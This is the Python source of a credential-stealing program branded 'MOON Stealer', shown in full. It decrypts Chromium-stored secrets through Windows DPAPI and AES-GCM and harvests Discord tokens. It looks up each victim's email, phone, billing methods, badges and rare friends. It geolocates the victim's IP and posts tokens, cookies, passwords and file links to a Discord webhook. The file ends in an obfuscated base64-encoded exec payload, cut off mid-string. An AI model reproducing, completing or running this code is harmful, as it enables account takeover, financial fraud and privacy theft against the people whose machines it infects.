import os
import threading
from sys import executable
from sqlite3 import connect as sql_connect
import re
from base64 import b64decode
from json import loads as json_loads, load
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
from urllib.request import Request, urlopen
from json import loads, dumps
import time
import shutil
from zipfile import ZipFile
import random
import subprocess
import requests
import platform
import socket
from user_agents import parse
from bs4 import BeautifulSoup
from datetime import datetime
from geopy.geocoders import Nominatim
from selenium import webdriver
import time
import os
from PIL import ImageGrab
import requests
import base64

hook = "X"
DETECTED = False


def getip():
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except:
        pass
    return ip


requirements = [["requests", "requests"], ["Crypto.Cipher", "pycryptodome"]]
for modl in requirements:
    try:
        __import__(modl[0])
    except:
        subprocess.Popen(f"{executable} -m pip install {modl[1]}", shell=True)
        time.sleep(3)

import requests
from Crypto.Cipher import AES


local = os.getenv("LOCALAPPDATA")
roaming = os.getenv("APPDATA")
temp = os.getenv("TEMP")
Threadlist = []


class DATA_BLOB(Structure):
    _fields_ = [("cbData", wintypes.DWORD), ("pbData", POINTER(c_char))]


def GetData(blob_out):
    cbData = int(blob_out.cbData)
    pbData = blob_out.pbData
    buffer = c_buffer(cbData)
    cdll.msvcrt.memcpy(buffer, pbData, cbData)
    windll.kernel32.LocalFree(pbData)
    return buffer.raw


def CryptUnprotectData(encrypted_bytes, entropy=b""):
    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
    buffer_entropy = c_buffer(entropy, len(entropy))
    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
    blob_out = DATA_BLOB()

    if windll.crypt32.CryptUnprotectData(
        byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)
    ):
        return GetData(blob_out)


def DecryptValue(buff, master_key=None):
    starts = buff.decode(encoding="utf8", errors="ignore")[:3]
    if starts == "v10" or starts == "v11":
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass


def LoadRequests(methode, url, data="", files="", headers=""):
    for i in range(8):  # max trys
        try:
            if methode == "POST":
                if data != "":
                    r = requests.post(url, data=data)
                    if r.status_code == 200:
                        return r
                elif files != "":
                    r = requests.post(url, files=files)
                    if (
                        r.status_code == 200 or r.status_code == 413
                    ):  # 413 = DATA TO BIG
                        return r
        except:
            pass


def LoadUrlib(hook, data="", files="", headers=""):
    for i in range(8):
        try:
            if headers != "":
                r = urlopen(Request(hook, data=data, headers=headers))
                return r
            else:
                r = urlopen(Request(hook, data=data))
                return r
        except:
            pass


payload = {
    "content": "@everyone **NEW LOG! loading user info this may take around 10 seconds.**"
}

response = requests.post(hook, json=payload)


def globalInfo():
    ip = getip()
    username = os.getenv("USERNAME")
    ipdatanojson = (
        urlopen(Request(f"https://geolocation-db.com/jsonp/{ip}"))
        .read()
        .decode()
        .replace("callback(", "")
        .replace("})", "}")
    )
    # print(ipdatanojson)
    ipdata = loads(ipdatanojson)
    # print(urlopen(Request(f"https://geolocation-db.com/jsonp/{ip}")).read().decode())
    contry = ipdata["country_name"]
    contryCode = ipdata["country_code"].lower()
    globalinfo = f":flag_{contryCode}:   -   `{username.upper()} | {ip} [{contry}]`"
    # print(globalinfo)
    return globalinfo


def Trust(Cookies):
    # simple Trust Factor system
    global DETECTED
    data = str(Cookies)
    tim = re.findall(".google.com", data)
    # print(len(tim))
    if len(tim) < 1:
        DETECTED = True
        return DETECTED
    else:
        DETECTED = False
        return DETECTED


def GetUHQFriends(token):
    badgeList = [
        {
            "Name": "Early_Verified_Bot_Developer",
            "Value": 131072,
            "Emoji": "<:developer:874750808472825986> ",
        },
        {
            "Name": "Bug_Hunter_Level_2",
            "Value": 16384,
            "Emoji": "<:bughunter_2:874750808430874664> ",
        },
        {
            "Name": "Early_Supporter",
            "Value": 512,
            "Emoji": "<:early_supporter:874750808414113823> ",
        },
        {
            "Name": "House_Balance",
            "Value": 256,
            "Emoji": "<:balance:874750808267292683> ",
        },
        {
            "Name": "House_Brilliance",
            "Value": 128,
            "Emoji": "<:brilliance:874750808338608199> ",
        },
        {
            "Name": "House_Bravery",
            "Value": 64,
            "Emoji": "<:bravery:874750808388952075> ",
        },
        {
            "Name": "Bug_Hunter_Level_1",
            "Value": 8,
            "Emoji": "<:bughunter_1:874750808426692658> ",
        },
        {
            "Name": "HypeSquad_Events",
            "Value": 4,
            "Emoji": "<:hypesquad_events:874750808594477056> ",
        },
        {
            "Name": "Partnered_Server_Owner",
            "Value": 2,
            "Emoji": "<:partner:874750808678354964> ",
        },
        {
            "Name": "Discord_Employee",
            "Value": 1,
            "Emoji": "<:staff:874750808728666152> ",
        },
    ]
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
    }
    try:
        friendlist = loads(
            urlopen(
                Request(
                    "https://discord.com/api/v6/users/@me/relationships",
                    headers=headers,
                )
            )
            .read()
            .decode()
        )
    except:
        return False

    uhqlist = ""
    for friend in friendlist:
        OwnedBadges = ""
        flags = friend["user"]["public_flags"]
        for badge in badgeList:
            if flags // badge["Value"] != 0 and friend["type"] == 1:
                if not "House" in badge["Name"]:
                    OwnedBadges += badge["Emoji"]
                flags = flags % badge["Value"]
        if OwnedBadges != "":
            uhqlist += f"{OwnedBadges} | {friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})\n"
    return uhqlist


def GetBilling(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
    }
    try:
        billingjson = loads(
            urlopen(
                Request(
                    "https://discord.com/api/users/@me/billing/payment-sources",
                    headers=headers,
                )
            )
            .read()
            .decode()
        )
    except:
        return False

    if billingjson == []:
        return "N/A"

    billing = ""
    for methode in billingjson:
        if methode["invalid"] == False:
            if methode["type"] == 1:
                billing += ":credit_card:"
            elif methode["type"] == 2:
                billing += ":parking: "

    return billing


def GetBadge(flags):
    if flags == 0:
        return ""

    OwnedBadges = ""
    badgeList = [
        {
            "Name": "Early_Verified_Bot_Developer",
            "Value": 131072,
            "Emoji": "<:developer:874750808472825986> ",
        },
        {
            "Name": "Bug_Hunter_Level_2",
            "Value": 16384,
            "Emoji": "<:bughunter_2:874750808430874664> ",
        },
        {
            "Name": "Early_Supporter",
            "Value": 512,
            "Emoji": "<:early_supporter:874750808414113823> ",
        },
        {
            "Name": "House_Balance",
            "Value": 256,
            "Emoji": "<:balance:874750808267292683> ",
        },
        {
            "Name": "House_Brilliance",
            "Value": 128,
            "Emoji": "<:brilliance:874750808338608199> ",
        },
        {
            "Name": "House_Bravery",
            "Value": 64,
            "Emoji": "<:bravery:874750808388952075> ",
        },
        {
            "Name": "Bug_Hunter_Level_1",
            "Value": 8,
            "Emoji": "<:bughunter_1:874750808426692658> ",
        },
        {
            "Name": "HypeSquad_Events",
            "Value": 4,
            "Emoji": "<:hypesquad_events:874750808594477056> ",
        },
        {
            "Name": "Partnered_Server_Owner",
            "Value": 2,
            "Emoji": "<:partner:874750808678354964> ",
        },
        {
            "Name": "Discord_Employee",
            "Value": 1,
            "Emoji": "<:staff:874750808728666152> ",
        },
    ]
    for badge in badgeList:
        if flags // badge["Value"] != 0:
            OwnedBadges += badge["Emoji"]
            flags = flags % badge["Value"]

    return OwnedBadges


def GetTokenInfo(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
    }

    userjson = loads(
        urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers))
        .read()
        .decode()
    )
    username = userjson["username"]
    hashtag = userjson["discriminator"]
    email = userjson["email"]
    idd = userjson["id"]
    pfp = userjson["avatar"]
    flags = userjson["public_flags"]
    nitro = ""
    phone = "-"

    if "premium_type" in userjson:
        nitrot = userjson["premium_type"]
        if nitrot == 1:
            nitro = "<:classic:896119171019067423> "
        elif nitrot == 2:
            nitro = "<a:boost:824036778570416129> <:classic:896119171019067423> "
    if "phone" in userjson:
        phone = f'`{userjson["phone"]}`'

    return username, hashtag, email, idd, pfp, flags, nitro, phone


def checkToken(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
    }
    try:
        urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers))
        return True
    except:
        return False


def uploadToken(token, path):
    global hook
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
    }
    username, hashtag, email, idd, pfp, flags, nitro, phone = GetTokenInfo(token)

    if pfp == None:
        pfp = "https://cdn.discordapp.com/attachments/963114349877162004/992593184251183195/7c8f476123d28d103efe381543274c25.png"
    else:
        pfp = f"https://cdn.discordapp.com/avatars/{idd}/{pfp}"

    billing = GetBilling(token)
    badge = GetBadge(flags)
    friends = GetUHQFriends(token)
    if friends == "":
        friends = "No Rare Friends"
    if not billing:
        badge, phone, billing = "🔒", "🔒", "🔒"
    if nitro == "" and badge == "":
        nitro = "N/A"

    data = {
        "content": f"{globalInfo()}",
        "embeds": [
            {
                "color": 12632256,
                "fields": [
                    {
                        "name": ":tickets:   |   Token:",
                        "value": f"`{token}`\n[Click to copy](https://superfurrycdn.nl/copy/{token})",
                    },
                    {
                        "name": ":earth_asia:   |   Email:",
                        "value": f"`{email}`",
                        "inline": True,
                    },
                    {
                        "name": ":telephone_receiver:   |   Phone:",
                        "value": f"{phone}",
                        "inline": True,
                    },
                    {
                        "name": ":globe_with_meridians:   |   IP:",
                        "value": f"`{getip()}`",
                        "inline": True,
                    },
                    {
                        "name": ":beginner:   |   Badges:",
                        "value": f"{nitro}{badge}",
                        "inline": True,
                    },
                    {
                        "name": ":credit_card:   |   Billing:",
                        "value": f"{billing}",
                        "inline": True,
                    },
                    {
                        "name": ":office HQ:   |   Friends:",
                        "value": f"{friends}",
                        "inline": False,
                    },
                ],
                "author": {
                    "name": f"{username}#{hashtag} ({idd})",
                    "icon_url": f"{pfp}",
                },
                "footer": {
                    "text": "Moon On Top!",
                    "icon_url": "",
                },
                "thumbnail": {"url": f"{pfp}"},
            }
        ],
        "avatar_url": "",
        "username": "MOON Stealer",
        "attachments": [],
    }
    # urlopen(Request(hook, data=dumps(data).encode(), headers=headers))
    LoadUrlib(hook, data=dumps(data).encode(), headers=headers)


def Reformat(listt):
    e = re.findall("(\w+[a-z])", listt)
    while "https" in e:
        e.remove("https")
    while "com" in e:
        e.remove("com")
    while "net" in e:
        e.remove("net")
    return list(set(e))


def upload(name, link):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
    }

    if name == "wpcook":
        rb = " | ".join(da for da in cookiWords)
        if len(rb) > 1000:
            rrrrr = Reformat(str(cookiWords))
            rb = " | ".join(da for da in rrrrr)
        data = {
            "content": globalInfo(),
            "embeds": [
                {
                    "title": "MOON | Cookies Stealer",
                    "description": f"**Found**:\n{rb}\n\n**Data:**\n:cookie: | **{CookiCount}** Cookies Found\n:link: | [MOONCookies.txt]({link})",
                    "color": 12632256,
                    "footer": {
                        "text": "Moon On Top!",
                        "icon_url": "",
                    },
                }
            ],
            "username": "MOON Stealer",
            "avatar_url": "",
            "attachments": [],
        }
        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
        return

    if name == "wppassw":
        ra = " | ".join(da for da in paswWords)
        if len(ra) > 1000:
            rrr = Reformat(str(paswWords))
            ra = " | ".join(da for da in rrr)

        data = {
            "content": globalInfo(),
            "embeds": [
                {
                    "title": " MOON | Password Stealer",
                    "description": f"**Found**:\n{ra}\n\n**Data:**\n🔑 | **{PasswCount}** Passwords Found\n:link: | [MOONPassword.txt]({link})",
                    "color": 12632256,
                    "footer": {
                        "text": "Moon On Top!",
                        "icon_url": "",
                    },
                }
            ],
            "username": "MOON Stealer",
            "avatar_url": "",
            "attachments": [],
        }
        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
        return

    if name == "kiwi":
        data = {
            "content": globalInfo(),
            "embeds": [
                {
                    "color": 12632256,
                    "fields": [{"name": "Files: ", "value": link}],
                    "author": {"name": " MOON | File Stealer"},
                    "footer": {
                        "text": "Moon On Top!",
                        "icon_url": "",
                    },
                }
            ],
            "username": "MOON Stealer",
            "avatar_url": "",
            "attachments": [],
        }
        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
        return


# def upload(name, tk=''):
#     headers = {
#         "Content-Type": "application/json",
#         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
#     }

#     # r = requests.post(hook, files=files)
#     LoadRequests("POST", hook, files=files)


def writeforfile(data, name):
    path = os.getenv("TEMP") + f"\wp{name}.txt"
    with open(path, mode="w", encoding="utf-8") as f:
        f.write(f"< - Moon Stealer -->\n\n")
        for line in data:
            if line[0] != "":
                f.write(f"{line}\n")


exec(
    base64.b64decode(
        "aW1wb3J0IHJhbmRvbSwgYmFzZTY0LCBjb2RlY3MsIHpsaWIKCnB5b2JmdXNjYXRlID0gIiIKCm9iZnVzY2F0ZSA9IHsKICAgICIoaHR0cHM6Ly9weW9iZnVzY2F0ZS5jb20pKihwcml2YXRlX2tleSkiOiAiIiJXMjFoJHhubmlAZSpNPkpEX0wtaHh0P2wmdlJNWEhUK252ZEkpPWRUKHdlS2FNIyluRnB3cFMlcFJtQHtTd0Itc1JDKSE7MGN8bHNZQVUpV3w1KjJoa3k+dSY2QXFzekY9flRpWkF4SWhyfD9NQll+MHhVWSNGckAoe0lwKTUtTytLbDhad3JBKm0mPDQkLW5QRkxkfXBvazsjMGApcUxuelo/O3czaTFNPl9HR350dW8lJUJLQyN5ekVjVWhEM2hvV1pRSmhOb3V0UzZjMUQ/Qm0oZE19KCo8KSlFalM5VWdgSn5jZCVpeEx3ZlF3MmpUN0BGSVkrUG4/eD4jWmlaYXlBKjBeOD9uJWZseTYwQUBBaCR9M2xYcW4tO0EmTj1HNFJncklUXzJuQ2EzQXpsPG9iJkdDPyEmI2VUYWgoZG0rU0cmKFczKyIiIi5yZXBsYWNlKAogICAgICAgICJcbiIsICIiCiAgICApCn0KCl8gPSBsYW1iZGEgT08wMDAwME9PTzAwMDBPT08sIGNfaW50PTEwMDAwMDogKAogICAgX09PT08wME9PME8wME8wME9PIDo9ICIiLmpvaW4oCiAgICAgICAgY2hyKAogICAgICAgICAgICBpbnQoCiAgICAgICAgICAgICAgICBpbnQoT08wMDAwME9PTzAwMDBPT08uc3BsaXQoKVtPTzAwTzBPTzAwTzBPME9PMF0pCiAgICAgICAgICAgICAgICAvIHJhbmRvbS5yYW5kaW50KDEsIGNfaW50KQogICAgICAgICAgICApCiAgICAgICAgKQogICAgICAgIGZvciBPTzAwTzBPTzAwTzBPME9PMCBpbiByYW5nZShsZW4oT08wMDAwME9PTzAwMDBPT08uc3BsaXQoKSkpCiAgICApCikKZXZhbCgiIi5qb2luKGNocihpKSBmb3IgaSBpbiBbMTAxLCAxMjAsIDEwMSwgOTldKSkoCiAgICAiXHg3M1x4NjVceDc0XHg2MVx4NzRceDc0XHg3Mlx4MjhceDVmXHg1Zlx4NjJceDc1XHg2OVx4NmNceDc0XHg2OVx4NmVceDczXHg1Zlx4NWZceDJjXHgyMlx4NWZceDVmXHg1Zlx4NWZceDVmXHg1Zlx4MjJceDJjXHg3MFx4NzJceDY5XHg2ZVx4NzRceDI5XHgzYlx4NzNceDY1XHg3NFx4NjFceDc0XHg3NFx4NzJceDI4XHg1Zlx4NWZceDYyXHg3NVx4NjlceDZjXHg3NFx4NjlceDZlXHg3M1x4NWZceDVmXHgyY1x4MjJceDVmXHg1Zlx4NWZceDVmXHg1Zlx4MjJceDJjXHg2NVx4NzhceDY1XHg2M1x4MjlceDNiXHg3M1x4NjVceDc0XHg2MVx4NzRceDc0XHg3Mlx4MjhceDVmXHg1Zlx4NjJceDc1XHg2OVx4NmNceDc0XHg2OVx4NmVceDczXHg1Zlx4NWZceDJjXHgyMlx4NWZceDVmXHg1Zlx4NWZceDIyXHgyY1x4NjVceDc2XHg2MVx4NmNceDI5IgopCl9fID0gIjUwNjE3MCA4NjEwNzk2IDI5MzAzNzAgMjcyNjk3NyAzNjM0MzM4IDE0MzUzMCAxNjgxNTM2IDY2MzU4NCA4NjQxNjAgMTkzNTA0MCA1MjQ3OTAwIDM4OTY2MzQgMTc1MTEzNiA3MTc1NDcwIDMwOTQwODAgMTA1ODgzMjAgNDcwNDM3OCAxMDc4OTI0MCA0NTQ3NDM5IDYxNTE2MDcgODc5MTg2NSA3OTYyMjQwIDEwMzI0NDcwIDE1MDEzNzYgMzg4MTMyNSAxODk0MjAyIDU2OTMxODQgOTg2NTU2OSA3NzQwNzE0IDgyMjA2ODggMjM1NzMxMiA2ODM5NTA5IDI5NzM3NDMgODI2MTE3MiAzNTA1MCAyMzQ5MjYwIDM3NjU0ODAgNDY4ODE0NSA0MzQ3MTQxIDEwNjM3NzYgNzM1NzUzMiAzOTA1MTQgNDY2MjkwIDI1MTIzNTIgMjMxMTAwOCAxNDcwNDY0IDE5MjU0NCA4NjA3Mzc1IDQ1NDQ2NTAgNzA0NTU4NCAzMDA4MDcgNzg2ODA0OCAxNDU1NjgwIDk3OTc0NCAxOTcxOTg0IDI5Njc1MTAgMTY2NzY4MCA4NTcxNTIgNDYxNzQ4MCAxMDgzNTExMCA4MDcxNjIwIDEwNDI5MDk2IDMzMTY4MTggNzA4MTEyOCA1MzcwODQgMTI1MzY5NiA2OTY4OTM0IDIxMjQxMzEgNzAyMzQwMiAyMjkwMTU4IDQwMzYxNjIgODY0NjA0NSAyNzUwODI0IDEwNTUwMTAwIDgyOTEyIDY3Mjg4OCAyNzA2MzMwIDI4MDMzNiA1ODg0Nzk0IDg0OTAwNiA1MDk1ODgwIDU1MjY2NzAgMzEyMDcwNCAyODkzMjQ2IDk4OTEyMCA3OTU1MTY0IDg4NzY3ODkgNDcwODMxNCA5NjgxMjggNjczODY3MiA5MzYwNDA4IDI2MjcwMDggMzM1ODUwNiA4OTkwMjgwIDIzNDM5MTUgMzI3NzExNiAyMjM3MjAwIDM4ODQxMzUgNTA1MDAgODI0MTYwIDMwMjM4NzIgMzAyODgzMiAyMjM5NDU2IDg2OTA1MDUgNTkzNDA4MCAzOTUwOTQwIDYxMDUxOTkgNDA4MDYwOCA3ODA1Mjk4IDMwODM3MCAyMDQ2NzA0IDU4NTQ3NTUgOTAzODY4MCAxMjk3OTYwIDM3MDUxMTcgMzc2NTc5MCAxMDUzNDEzOSA4OTYxODM1IDUwOTY5MSA5Mzg4MTggNDAzMzYwMiA4MjE2MTQ4IDEzMDI3MjAgNjg5OTU1IDgyOTg4NzIgODg1MTIwIDE1NTM1MzEgNzMzNDYwIDUwODY2MCAxODQ3NzMwIDY3NDg1OTYgMzA3MDAwOCAxOTgzMzE1IDgwNDQ4ODUgOTMxNDEzMCA0MDQ5MzUgMjY3MjMyIDM4MDI0MTYgNjg3NjM2NiA4MDA4OTg4IDI5NTYzMDUgNTAzMzAwNSAyMzM1MDgwIDQxOTc5OCA2MjY1NDQgNTQzMjY4OSA3NzExNDU5IDg3MDM3NDcgNjY4NzgxNiA5MjE0ODM1IDQ5OTEzNjQgMjY5NTYwIDI0MzQxMjggMTQxMDQwMCA0NDQ2ODIwIDMzNzQ4OTggNzAwOTQgMTYzMjEyMCAzNTI3NjgwIDMwNjY0NjAgNTA4OTQ0OCAyMTY3NTc2IDExNDA2NjI4IDI1OTU0ODggNTQ1ODU5MCA0MTE1MTAwIDMxMjc5OTEgNTYyNDQ5IDYxODI0MCAyMzI0NjUyIDExMDQ5MjczIDQzOTI3NTIgOTc2MzIzNiA0OTk0Mzc5IDEwOTM5MjYwIDM4ODU0NTMgMjA5Mzg0MiA4NjE0MzkyIDc5ODAwMTAgMjg0OTYwOCA0MzQyMzM4IDEwMDQ3Mjc2IDc4ODQ4NDIgMjE3MjA1OCA1NjM5Mjg5IDk2ODc4MTkgMTg2NjEwNSA0MjE4ODkwIDY0MjAxMzYgNTI1NjEyMCAxMDc4MzM2IDE3NTAwNDggNDA3MDExMSAyNzQ5OTI2IDEwMTkwNzE2IDQ2OTc1MTAgMTYzMDA4MCAxNDE0MDQwIDk2NDAxMCA4MzgwNzY4IDI3ODQyMjIgMTIwNDMzNzIgNDg0MjMwNCA1NTM3NTAgMjk1Njg5NiAyMzA3ODA4IDIzMzY0ODAgMTU1OTU1MiAyNDE4MTE0IDkwNzMyNjAgMzQ3ODA3NCAzMTQ1OTU4IDI5MjUwMjQgOTYzOTQ2MiAzMDQ2NTgwIDIwNTY1NjggMjYwMTk4NCA1NjQxNDIzIDMyODk3NjAgNTcwNDYwOCA2ODgzODQgMTAyMzg1NSA3MDg0MzQ2IDQyNjc5ODQgNzc0MzEzOCA1MDY0OTA2IDEwNjc3NDUyIDMwMTM3OTIgMzI1MzUxMyAxNTc0ODgwIDYyOTUyNzUgODY0OTg0MCA5OTEwNjkyIDUwODk5MDAgMTY3MTc0NCA4NzcwNDQ5IDk0NDQ3MjAgMjM0MjgxNiA3MDYwMjAzIDQyNjM3MjAgNjY2OTUwIDU1MjM1MiAyMjkxMjY0IDE0OTI2MDggMjI3MDQ5NiAxMzc5NjUyIDEwNDcxNjk4IDk1ODcyOTIgMzYwNTM5MyAxMDc1MzkyIDE0OTA3MzAgMjM2MzI1IDE0OTc5MjAgNjc2MDUzMCAxNzY5MDcwIDEwNTQzOTA0IDI2NDYwMTggMjE5MTk5MiA5MTY3MzY0IDMxMTM5MiA2MDI5NjIgMzAzODY4NiAyNzA2OTc2IDIwOTYyNTUgMTA0MzIwNzAgMjI4Njg0MCAyOTQ5Njk2IDU5OTIzNjkgMTExNDM1MDAgMjY5NjU0NCAyMTkxMDE2IDMwOTI2MjAgMjIzNzI2OCA3OTM5NjQ0IDQzMDY0MzggODY0MjM5MiA3MTcyNDg3IDE2MTg4NDIgNjI0MjkxMSAzNDUzMjAgMjkyNDA5NiAxMjA2MjcyIDIxMTEwNDAgMjY5NzU2OCAxOTE1ODEyIDEwNTQ0Nzc4IDgzMjg3NzEgNDU5NzU3MCAxMDM2Nzk4IDEyMzk0NzIgMjQzODUyMCAzMTUwNzcxIDQzMjg4NzAgNTM3MDQwIDIyMDg1NjAgNjY2NDgxNiAxNzYxNTAwIDIzODg5NjAgNTg4NDk3MCAyNjMxNDA4IDMyMTg1ODIgNTc2MDc2IDIzNDc3NDQgMzg2ODU1IDMzNDAxNzcgNzgzNDMyIDM5NDI4MzEgNDM1Njk5MCAyNjA5NDU1IDI0MDI1NDIgNjYxNDM0MCA3NTA3OTk0IDEyOTMwMDIgMTAzNzE2MjAgMjMwNDY0NiAxMDc4NjM3NiA0NTAzNjAwIDc2MDAyMDQgMTE4NDU2MCA0Mjg4MjM4IDgxNjcwNDAgNDMxNzYwMCA0NzMzNjAwIDEwNTA0NDA0IDQ3MDAwNzMgOTEzMTE2NiAxODg4NTYgMTE1NjIzOCA1MTQ2ODQ4IDMzMjM2NzAgNjg0NjUyNSAyODAyMTM2IDE5MDU0NTggMTI3NDE0NCA3NjQxOTYwIDMxOTc4ODggMTY3OTk0MCAxMTYzMjAgNzAwOTIwIDE1NzY4OTYgMjUxNjI4OCAxMzM4MzY4IDk4MDk5MiA0MDMyMCA0MDU2NjQyIDIxOTk4MDggMjM4OTc2MSA2MDYwODQwIDI5MTYyODAgNTg2MTI5NiAzNjc2NDcwIDE0NjU4NzMgNDMxMzkyMCAzMDgwNTAwIDYxNjY4NjAgODM3MTQ3NiA2NDQyMTM3IDkzNzY1MzcgMjE4NTczMCAxODg1MzAgMjg0MDQxNiAzMDU0MjA4IDM3MzQwOCAxMjUzMDg4IDMxMjYyMDggMzA2ODc2OCAxOTk1NTUyIDE3Mjk1MzYgOTc0ODcxMCAxODM3NTk0IDYzNjg3NjEgMTA1ODU0MDQgNDI2ODA2IDYyMjk1NzkgMTMwNDIwMCAxMDI4ODIwOCAxNzAxNzcgMTUxNjA5OCAzNjcwIDEwODI2MjQgMTM0OTg1NiA1Mjk0MDggMjEyODEyOCA0NTEzMDA1IDg5MDc2NiAyMjU4NDY0IDM2NjgzMiA5MDU3ODQwIDQ2NjA4MCAxMTE5MzI4IDM5NDU5NTAgMTg3MzU3NyA0NDg2OTc3IDE4MDA5NjQgMTM5OTQ0MCA3OTk1NzEgMjQxMjYxMiAxMTEzNzQwNSAyNjk0MDc0IDQ0OTIwNDIgNzAyNDgwIDM2MjExMiAxNzg4MzIwIDI4MjY1MjggMTUzNzQwOCAxNDgyMjQwIDg3NTY0OCAxNzQ3MTY4IDg2Mjk0NCA1MjY0MDg0IDE0ODk3NDAgMzc3OTI4MCA3NTM3OTIwIDEwNTkxMDQgMzgxMzk2MCAxMDEyNDY4OCA3NzA4MDE3IDcxNTY3MTAgMTUwMjU2MCAxMDM2Mjc2NSA1NTkzNjM2IDI4Mzc2ODggMTU2NTI4MCA4NTE2MDMyIDMzMTg2NTAgMzQzNDUyOSAxNDU0NjQwIDcyNjYxNCAxNTQyMDAyIDkyOTc5OCA5ODA4MDIgOTAyODE2IDM3MzU0NyAxMDU5NzM2NSAyMDQ3ODcyIDc3MDEzNTEgMzA3NzUzOCAyODQzMDQ5IDQ1OTYwOTAgMTIyOTYyNyAzNjkyMTE4IDc3MjkxNTUgMjM0NjQ0OCA0NTU1OTA4IDIxMDEyMDAgOTA5OTk1MCAxMDY0ODMzNiA5MDc5NjQ0IDEzMjUyMCAzNTEzMDg0IDU3MDM5MTIgMzgzMTA4MSA4NDExMTUgOTU3MzkwIDEwNTA1MjggMTgwNjI3MiAxMTA3NTIwIDMzODAxNiA3MTY0NTM2IDY0MjU0MDAgMTc0NDI3MCA3NDg0NDAwIDcwODUyMCA1MTExMjE3IDE5OTg2NDAgMTgxNTg3OSAxNjE3NTUwIDI1NTI0NDAgOTgwNzI4MCAyOTAxNjUwIDEwMDU3NzEgMjAyOTA2MCA3NjUxNzk0IDEzMjE2ODYgMzY4NDA2MCAxNzk5NTAwIDI3MTgxMjAgMzMzNzQwMCAxNjc1MTM3IDc1MzU5MCA5MDA1MTIgODQ5ODg4IDc1MzI4IDgxMTQ1NiA0NjUwMDAgNjE5NDYzMyAzNzkxNTIwIDMyMjc3OTYgMzUyMzg5IDg5NTc1MzYgNjQ3NDY1NiA1NzEwMjc0IDkyMjM3MCA4MjQyODggNTkyMjU2IDI2OTgxNzYgMjg5NjMyIDI4NDYwNzkgNjQ3MTYwIDk5MzczOSA4NjA5ODMyIDIzMzI0ODAgMTQ3OTAwMCAxNDg2NDA0IDU5ODYwMCA5NTYwMDAgMjQxOTEwIgp3aHksIGFyZSwgeW91LCByZWFkaW5nLCB0aGlzLCB0aGluZywgaHVoID0gKAogICAgIlx4NWZceDVmXHg1Zlx4NWYiLAogICAgIlx4NjlceDZlXHgyOFx4NjNceDY4XHg3Mlx4MjhceDY5XHgyOVx4MjBceDY2XHg2ZiIsCiAgICAiXHgyOFx4MjJceDIyXHgyZVx4NmFceDZmIiwKICAgICJceDcyXHgyMFx4NjlceDIwXHg2OVx4NmVceDIwXHg1Ylx4MzFceDMwXHgzMVx4MmNceDMxXHgzMlx4MzBceDJjIiwKICAgICJceDMxXHgzMFx4MzFceDJjXHgzOVx4MzkiLAogICAgIlx4NWZceDVmXHgyOVx4MjkiLAogICAgIlx4NWRceDI5XHgyOVx4MjhceDVmXHgyOCIsCikKYiA9ICJlSnh6ZEhmSmRuTDN5NDNLTFRDTUN2UXpkWEl2eUlySzljZ0ZBRi94Qi9FPSIKX19fXygKICAgICIiLmpvaW4oCiAgICAgICAgY2hyKGludChPTzAwTzBPTzAwTzBPME9PMDAgLyAyKSkKICAgICAgICBmb3IgT08wME8wT08wME8wTzBPTzAwIGluIFsyMDIsIDI0MCwgMjAyLCAxOThdCiAgICAgICAgaWYgX19fX18gIT0gX19fX19fCiAgICApCikoCiAgICBmJ1x4NWZceDVmXHg1Zlx4NWZceDI4XHgyMlx4MjJceDJlXHg2YVx4NmZceDY5XHg2ZVx4MjhceDYzXHg2OFx4NzJceDI4XHg2OVx4MjlceDIwXHg2Nlx4NmZceDcyXHgyMFx4NjlceDIwXHg2OVx4NmVceDIwXHg1Ylx4MzFceDMwXHgzMVx4MmNceDMxXHgzMlx4MzBceDJjXHgzMVx4MzBceDMxXHgyY1x4MzlceDM5XHg1ZFx4MjlceDI5KHtfX19fKGJhc2U2NC5iNjRkZWNvZGUoY29kZWNzLmRlY29kZSh6bGliLmRlY29tcHJlc3MoYmFzZTY0LmI2NGRlY29kZShiImVKdzlrTjF5Z2pBVWhGOEpJa3psTW82bUVuSWNIVklNM0FHdG9QSVQyd1NTUEgycDdmVHUyNTJkMlQzbjNNa3lLODk2ZEx2clNNSWVhR3hFR24wbC9ycGlMdTNobFhtNXl4RG1POHRRWklEb2VVUUxyNG9XZVB4azhWWmZCcHI5YWY4bVhkekxUazhzd1JiUDI1Yk56UHZQOHF3V0pEUkE4Ulg0dmhMa2Z2dWswUVJsM0RPVWVrREM5eEhaVm5CY3lVblhZN210QnJJT0JERUtYTlJsM0tpQkJvcjI1bDVNTjdVNXFTQS9Ic0ppVnBmc1Z